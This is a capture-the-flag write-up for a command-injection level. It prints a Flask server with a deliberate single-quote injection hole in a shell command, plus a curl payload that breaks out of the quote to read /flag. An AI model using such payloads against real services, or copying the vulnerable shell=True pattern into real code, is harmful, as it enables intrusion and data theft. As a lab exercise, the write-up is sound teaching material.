# CMDi 3

## Challenge Description

In this level, we’re provided with a vulnerable web endpoint that takes a `top-path` query parameter and executes a command like:

## What is the meaning of `'`

* `'` is *strong quoting*
* `"` is *weak quoting*

### Example

```
echo '$HOME'
```
Output: `$HOME` (not expanded)

```
echo "$HOME"
```
Output: `/home/yourname` (expanded)


### The relationship between Command Injection:

Developers often try to protect user input by wrapping it in single quotes:

```
os.system(f"ls -l '{user_input}'")
```

They assume this will prevent the user from injecting dangerous characters like `;`, `|`, `&`, etc.

But if the attacker includes a `'` in their input — they can break out of the quoted string and inject arbitrary shell commands.

You can use an external single quote, then you can do:

* closing original quote
* injecting your command


## Server

```
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/test", methods=["GET"])
def challenge():
    arg = flask.request.args.get("top-path", "/challenge")
    command = f"ls -l '{arg}'"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/test"><input type=text name=top-path><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

## Vulnerable Code Snippet

```
arg = flask.request.args.get("top-path", "/challenge")
command = f"ls -l '{arg}'"

# Executes the command in a shell
subprocess.run(command, shell=True, ...)
```

This creates a shell command like:

```
ls -l 'USER_INPUT'
```

## Exploitation Strategy

To exploit this, we close the initial ' string, insert our malicious command, and then re-open the quote to keep the shell syntax valid.

### Payload

```
curl "http://challenge.localhost:80/test?top-path=/flag%20';%20cat%20/flag'"
```

This breaks the command into:

```
ls -l '/flag '; cat /flag'
```

## Conclusion

This challenge demonstrated a classic command injection vulnerability via single-quote breakout.
Even though the developer tried to isolate user input using ', the attacker was able to escape the quote, inject a new command, and retrieve the sensitive `/flag` file.